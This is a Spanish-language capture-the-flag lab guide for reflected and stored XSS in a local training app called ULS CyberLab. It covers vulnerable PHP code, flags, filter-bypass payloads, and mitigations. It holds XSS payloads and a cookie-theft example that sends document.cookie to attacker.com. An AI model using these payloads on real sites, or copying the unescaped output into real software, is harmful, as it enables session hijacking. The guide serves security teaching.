---
title: "Lab 2: Cross-Site Scripting"
description: Guía práctica del laboratorio de XSS en ULS CyberLab
sidebar:
  order: 22
---

# Lab 2: Cross-Site Scripting (XSS)

**Puntos totales:** 30 pts (10 + 20)  
**Dificultad:** 🟢 Fácil  
**Módulo:** `http://localhost/mini-cyberlab/modules/xss.php`

---

## Contexto

XSS permite inyectar código JavaScript malicioso en páginas web que otros usuarios verán. En ULS CyberLab, la sección de búsqueda y los comentarios no escapan el output del usuario, permitiendo ejecutar scripts arbitrarios en el navegador.

**Diferencia clave con SQLi:** SQLi ataca el servidor. XSS ataca al **usuario/navegador**.

---

## Challenge 1: Reflected XSS (10 puntos)

**Flag:** `FLAG{XSS_R3FL3CT3D}`  
**Vector:** Parámetro GET `?q=` en el campo de búsqueda

### Objetivo

Hacer que la aplicación **refleje** tu script JavaScript en la página para que sea ejecutado por el navegador.

### Código Vulnerable

```php
// modules/xss.php
$search_term = $_GET['q'] ?? '';

// ❌ Sin escapar — el valor se inyecta directamente en el HTML
echo "Resultados para: $search_term";
```

Cuando ingresas `<script>alert('XSS')</script>`, el HTML generado es:

```html
<div>Resultados para: <script>alert('XSS')</script></div>
```

El navegador ve la etiqueta `<script>` y **la ejecuta**.

### Paso a Paso

1. Abre `http://localhost/mini-cyberlab/modules/xss.php`
2. En el campo de búsqueda, escribe:
   ```html
   <script>alert('XSS Reflejado!')</script>
   ```
3. Haz clic en **Buscar**

### Resultado Esperado

- ✅ Aparece un popup `alert()` en el navegador
- ✅ Flag `FLAG{XSS_R3FL3CT3D}` capturada automáticamente (10 pts)

### ¿Por qué la flag se captura automáticamente?

ULS CyberLab hookea la función `alert` del navegador:

```javascript
// Código en xss.php (simplificado)
const originalAlert = window.alert;
window.alert = function(msg) {
    originalAlert(msg);  // Muestra el alert normalmente
    
    // Captura la flag automáticamente
    fetch('/mini-cyberlab/api/capture_flag.php', {
        method: 'POST',
        headers: {'Content-Type': 'application/x-www-form-urlencoded'},
        body: 'flag=FLAG{XSS_R3FL3CT3D}'
    });
};
```

### Payloads Alternativos (si `<script>` es filtrado)

```html
<!-- Via evento HTML -->
<img src=x onerror=alert('XSS')>
<svg onload=alert('XSS')>
<body onload=alert('XSS')>
<input autofocus onfocus=alert('XSS')>

<!-- Via href JavaScript -->
<a href="javascript:alert('XSS')">Click aquí</a>

<!-- Sin comillas -->
<img src=x onerror=alert`XSS`>
```

---

## Challenge 2: Stored XSS (20 puntos)

**Flag:** `FLAG{XSS_ST0R3D_PWN3D}`  
**Vector:** Formulario de comentarios

### Objetivo

Inyectar un script malicioso en la base de datos a través del formulario de comentarios, que se ejecute **cuando cualquier usuario visite la página**.

### Código Vulnerable

```php
// Almacenamiento - usa prepared statement (el storage no es el problema)
$comment = $_POST['comment'];
$stmt = $conn->prepare("INSERT INTO comments (comment, user_id) VALUES (?, ?)");
$stmt->bind_param("si", $comment, $_SESSION['user_id']);
$stmt->execute();  // El payload se guarda en BD

// Renderizado - ❌ SIN htmlspecialchars()
foreach ($comments as $c) {
    echo '<div class="comment">' . $c['comment'] . '</div>';
    //                            ↑ Se renderiza el HTML/JS sin escapar
}
```

### Paso a Paso

1. En la sección de **comentarios** del módulo XSS
2. Escribe en el campo de comentario:
   ```html
   <script>alert('XSS Almacenado!')</script>
   ```
3. Haz clic en **Publicar Comentario**
4. El comentario aparece en la lista y el script se ejecuta

### Resultado Esperado

- ✅ Alert aparece al cargar los comentarios
- ✅ Flag `FLAG{XSS_ST0R3D_PWN3D}` capturada automáticamente (20 pts)
- ✅ El script se ejecutará para **cualquier usuario** que visite la sección

### El Impacto Real del Stored XSS

```javascript
// Payload más realista que un atacante real usaría:
<script>
  // Robar cookie de sesión
  var img = new Image();
  img.src = 'http://attacker.com/steal?c=' + document.cookie;
  
  // O redirigir al usuario
  // window.location = 'http://phishing-site.com';
  
  // O modificar el contenido
  // document.body.innerHTML = '<h1>HACKED</h1>';
</script>
```

En ULS CyberLab este payload se usa para capturar la flag de forma controlada.

---

## Diferencias: Reflected vs Stored XSS

| Aspecto | Reflected | Stored |
|---------|-----------|--------|
| **Persistencia** | No — solo en la URL | Sí — en la base de datos |
| **Víctimas** | Solo quien hace clic en el URL malicioso | Todos los que visiten la página |
| **Peligrosidad** | Media | Alta |
| **Detección** | Más fácil | Más difícil |
| **Ejemplo real** | Phishing por email con URL | Foro con comentarios infectados |

---

## Mitigación

### ✅ htmlspecialchars() — La solución principal en PHP

```php
// ❌ VULNERABLE
echo $user_input;
echo "Resultados para: $search_term";

// ✅ SEGURO
echo htmlspecialchars($user_input, ENT_QUOTES, 'UTF-8');
echo "Resultados para: " . htmlspecialchars($search_term, ENT_QUOTES, 'UTF-8');
```

`htmlspecialchars()` convierte caracteres peligrosos:
```
< → &lt;
> → &gt;
" → &quot;
' → &#039;
& → &amp;
```

```html
<!-- Input del atacante -->
<script>alert('XSS')</script>

<!-- Después de htmlspecialchars() — inofensivo -->
&lt;script&gt;alert(&#039;XSS&#039;)&lt;/script&gt;
```

### ✅ Content Security Policy (CSP)

```php
header("Content-Security-Policy: default-src 'self'; script-src 'self'");
```

### ✅ HTTPOnly Cookies

```php
session_set_cookie_params(['httponly' => true]);
```

Protege las cookies para que JavaScript no pueda leerlas.

---

## Recursos

- [PortSwigger XSS Labs (gratuito)](https://portswigger.net/web-security/cross-site-scripting)
- [XSS Game de Google](https://xss-game.appspot.com/)
- [OWASP XSS Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/Cross_Site_Scripting_Prevention_Cheat_Sheet.html)
